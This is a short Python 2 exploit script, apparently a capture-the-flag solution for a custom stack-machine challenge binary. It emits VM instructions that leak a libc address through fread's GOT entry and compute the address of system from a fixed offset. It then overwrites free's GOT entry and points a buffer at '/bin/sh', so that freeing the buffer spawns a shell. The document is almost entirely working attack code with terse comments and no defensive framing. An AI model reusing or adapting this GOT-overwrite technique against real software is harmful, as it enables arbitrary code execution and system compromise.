def get_stack_addr():
	print "LV 0 -3116\nLC 12540\nAD\nINT 3\n" # 0 : stack addr
def get_value(addr):
	print "LC 3\n"
	get_addr(addr)
	print "ST\nLV 1 0\n"
def get_addr(addr):
	print "LC " + str(addr) + "\nLV 0 0 \nSB\nLC 4\nDV\n"

get_stack_addr()
get_addr(0x605018) #free
get_value(0x605040)#fread
print "LC " +str(0x00007ffff76301a0-0x7ffff7607390)+"\nSB\nST\n" #calculate system address from fread addr and save to free
get_addr(0x60501c)#
get_value(0x605044)#
print "ST\n"#		save last 4 bytes to free
get_addr(0x605140)#var stack address
print "LV 0 0\nLC " +str(0x210-12304)+ "\nAD\nST\nHL" #change to "/bin/sh" address {so when free(stack) => system("/bin/sh")}







